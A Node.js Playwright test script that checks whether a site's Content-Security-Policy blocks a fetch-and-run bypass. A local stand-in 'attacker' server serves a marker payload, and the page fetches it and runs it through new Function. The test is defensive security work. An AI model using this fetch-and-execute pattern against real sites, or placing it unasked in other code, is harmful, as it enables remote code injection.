#!/usr/bin/env node
// Issue #126's own named test: the retired design-system bundle's bypass --
// a same-origin script fetching a payload from an outside server and
// running it -- must be blocked by the browser at load, not merely
// detected by a scanner reading files ahead of time. This proves it live:
// a second local server stands in for "an outside server" (a genuinely
// different origin, not just a different path -- CSP's host restriction is
// what is under test, and only a real cross-origin request exercises it),
// serves a payload that sets a page-visible marker if it ever runs, and the
// assembled artifact's own dist/_headers is applied exactly as
// check-assembled.mjs applies it (parseHeadersFile/headersFor are
// duplicated rather than imported on purpose -- see this file's own
// comment on why, below).
//
// Passes only if all three hold: the fetch to the "outside" origin never
// succeeds, the browser reports a securitypolicyviolation naming
// connect-src, and the payload's own marker is never set (the strongest of
// the three -- a check that only watched network status could be fooled by
// a payload that runs from a cached copy or a redirect the harness did not
// anticipate; this asks the page itself whether the code ran).

import { createServer } from 'node:http';
import { readFileSync, existsSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DIST = path.resolve(__dirname, '..', 'dist');

if (!existsSync(path.join(DIST, '_headers'))) {
  console.error('check-csp: dist/_headers missing -- run `npm run assemble` first.');
  process.exit(1);
}

// Duplicated from check-assembled.mjs rather than imported: both files
// parse the exact same on-disk format independently, on purpose -- a bug
// shared by both parsers would be a bug in the format itself, which the
// live Cloudflare Pages deployment would also hit, not a false pass unique
// to one script's own logic.
function parseHeadersFile(text) {
  const blocks = [];
  let current = null;
  for (const rawLine of text.split('\n')) {
    if (rawLine.trim() === '' || rawLine.trim().startsWith('#')) continue;
    if (!/^\s/.test(rawLine)) {
      current = { path: rawLine.trim(), headers: {} };
      blocks.push(current);
      continue;
    }
    if (!current) continue;
    const colon = rawLine.indexOf(':');
    if (colon === -1) continue;
    current.headers[rawLine.slice(0, colon).trim()] = rawLine.slice(colon + 1).trim();
  }
  return blocks;
}
function headersFor(blocks, pathname) {
  let matched = {};
  for (const block of blocks) {
    const isMatch = block.path.endsWith('/*')
      ? pathname.startsWith(block.path.slice(0, -1))
      : block.path === pathname;
    if (isMatch) matched = { ...matched, ...block.headers };
  }
  return matched;
}

const TYPES = {
  '.html': 'text/html',
  '.js': 'text/javascript',
};

// The target: the real assembled artifact, headers and all.
const headerBlocks = parseHeadersFile(readFileSync(path.join(DIST, '_headers'), 'utf-8'));
const targetServer = createServer((req, res) => {
  const p = (req.url ?? '/').split('?')[0];
  const filePath = p.endsWith('/') ? `${p}index.html` : p;
  const extraHeaders = headersFor(headerBlocks, p);
  try {
    const body = readFileSync(path.join(DIST, filePath));
    res.writeHead(200, { 'content-type': TYPES[path.extname(filePath)] ?? 'application/octet-stream', ...extraHeaders });
    res.end(body);
  } catch {
    res.writeHead(404, extraHeaders);
    res.end('not found');
  }
});
await new Promise((resolve) => targetServer.listen(0, '127.0.0.1', () => resolve(undefined)));
const targetOrigin = `http://127.0.0.1:${/** @type {import('node:net').AddressInfo} */ (targetServer.address()).port}`;

// The attacker: a second server, a genuinely different origin (different
// port on the loopback address still counts as cross-origin for CSP's own
// same-origin definition, which includes the port). Serves the retired
// bundle's own bypass shape -- a script that, if it ever runs, marks the
// page it runs on as compromised.
const PAYLOAD = "window.__csp_bypass_ran = true; document.title = 'PWNED';";
// A permissive CORS header, deliberately: CORS is the *target* server's own
// opt-in, controlled entirely by whoever runs it -- a real attacker's
// server would gladly allow every origin, since the whole point is to be
// fetchable from anywhere. Leaving CORS restrictive here would let the
// browser's ordinary cross-origin fetch rules block the request for a
// reason that has nothing to do with this policy (found by running this
// test with dist/_headers deliberately emptied as a negative control: the
// fetch was still blocked, but with no securitypolicyviolation event at
// all -- CORS, not CSP, had been doing the work, which would have made
// this test pass for the wrong reason against a real attacker who simply
// turns CORS on). connect-src is the boundary actually under test, and it
// does not care what the target server permits.
const attackerServer = createServer((req, res) => {
  res.writeHead(200, { 'content-type': 'text/javascript', 'access-control-allow-origin': '*' });
  res.end(PAYLOAD);
});
await new Promise((resolve) => attackerServer.listen(0, '127.0.0.1', () => resolve(undefined)));
const attackerOrigin = `http://127.0.0.1:${/** @type {import('node:net').AddressInfo} */ (attackerServer.address()).port}`;

const browser = await chromium.launch();
let failed = false;
const problems = [];

const page = await browser.newPage();
const violations = [];
await page.exposeFunction('__reportViolation', (v) => violations.push(v));
await page.addInitScript(() => {
  document.addEventListener('securitypolicyviolation', (e) => {
    // @ts-expect-error -- injected by exposeFunction above, no types here.
    window.__reportViolation(`${e.violatedDirective}: blocked ${e.blockedURI}`);
  });
});
await page.goto(`${targetOrigin}/`);
await page.waitForLoadState('networkidle').catch(() => {});

// The retired bundle's own attempt, run from inside the already-loaded,
// already-trusted page -- exactly the shape the issue describes ("a
// JavaScript file the check does read can fetch that .png and run its
// contents"): same-origin, already-legitimate code reaching for a payload
// at a host the policy does not name.
const result = await page.evaluate(async (attackerOrigin) => {
  try {
    const res = await fetch(`${attackerOrigin}/retired-bundle.js`);
    const code = await res.text();
    // eslint-disable-next-line no-new-func
    new Function(code)();
    return { fetched: true, ran: window.__csp_bypass_ran === true };
  } catch (error) {
    return { fetched: false, ran: false, error: String(error) };
  }
}, attackerOrigin);

await page.close();
await browser.close();
targetServer.close();
attackerServer.close();

console.log('fetch to the outside origin:', result.fetched ? 'SUCCEEDED (bad)' : 'blocked');
console.log('payload marker set:', result.ran ? 'YES (bad)' : 'no');
console.log('securitypolicyviolation events:', violations.length ? violations : '(none)');

if (result.fetched) problems.push('the fetch to an unapproved origin succeeded -- connect-src did not block it');
if (result.ran) problems.push('the payload actually ran -- window.__csp_bypass_ran was set');
if (violations.length === 0)
  problems.push('no securitypolicyviolation event fired -- the browser never reported blocking anything');
else if (!violations.some((v) => v.startsWith('connect-src')))
  problems.push(`a violation fired, but not on connect-src -- got: ${violations.join(', ')}`);

if (problems.length > 0) {
  failed = true;
  console.error('\ncheck-csp: FAILED -- the retired-bundle bypass was not blocked');
  for (const p of problems) console.error(`  ✗ ${p}`);
} else {
  console.log('\ncheck-csp: the retired-bundle bypass is blocked by the browser (issue #126).');
}

process.exit(failed ? 1 : 0);
